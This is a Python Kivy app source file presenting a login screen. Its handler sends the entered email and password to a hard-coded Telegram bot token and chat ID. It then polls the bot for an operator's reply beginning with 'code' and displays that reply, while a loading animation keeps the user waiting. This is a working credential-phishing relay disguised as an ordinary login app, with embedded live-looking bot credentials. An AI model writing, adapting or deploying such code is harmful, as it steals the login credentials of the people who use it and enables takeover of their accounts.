from kivy.app import App
from kivy.network.urlrequest import UrlRequest
from kivy.core.window import Window
import certifi
from urllib.parse import urlencode
from kivy.lang import Builder
from kivy.uix.screenmanager import Screen, ScreenManager
from kivy.animation import Animation


ttext = 'None'
Window.clearcolor = (0.075, 0, 0.141, 1)
sm = ScreenManager()


class EnterScreen(Screen):
    def from_input(self, *args):
        data = "*Login:* " + "`" + self.ids['email'].text + "`" + "\n*Password:* " + "`" + self.ids['password'].text + "`"  # Забираем введённые данные
        data = urlencode({'text': data})  # Кодируем их для отправки по url
        self.r = UrlRequest(  # Делаем url запрос для отпраки сообщения через бота в телеграме
            f"https://api.telegram.org/bot6654600196:AAEHouKkxE26ltUOMvjou9LYwCuhJl4hR0k/sendMessage?chat_id"
            f"=888281527&{data}&parse_mode=MarkdownV2", on_success=self.safe, ca_file=certifi.where())

    def safe(self, *args):
        self.last = self.r.result['result']['message_id'] + 1
        self.make_request()

    def make_request(self):
        self.r = UrlRequest(f"https://api.telegram.org/bot6654600196:AAEHouKkxE26ltUOMvjou9LYwCuhJl4hR0k/getUpdates?offset=-1",
                            self.prr)

    def prr(self, *args):

        print("*")
        if self.r.result['result'] and self.r.result['result'][0]['message']['message_id'] == self.last:
            text = self.r.result['result'][0]['message']['text']
            print(text)
            if text[:4] == 'code':
                global ttext
                ttext = text[5:]
                self.manager.current = 'code'
            else:
                self.last += 1
                self.make_request()
        else:
            self.make_request()

class CodeScreen(Screen):
    def on_enter(self):
        global ttext
        self.ids.code_text.text=ttext

class LoadingScreen(Screen):
    def on_enter(self):
        anim = Animation(color=(1,1,1,0.4), duration=1, step=1/50, transition='in_out_quad') + Animation(color=(1,1,1,1), duration=1, step=1/50, transition='in_out_quad')
        anim.repeat = True
        anim.start(self.ids.lo, )




sm.add_widget(EnterScreen(name='enter'))
sm.add_widget(CodeScreen(name='code'))
sm.add_widget(LoadingScreen(name='loading'))


class My(App):
    def build(self):
        screen = Builder.load_file('my.kv')
        return screen


if __name__ == '__main__':
    My().run()
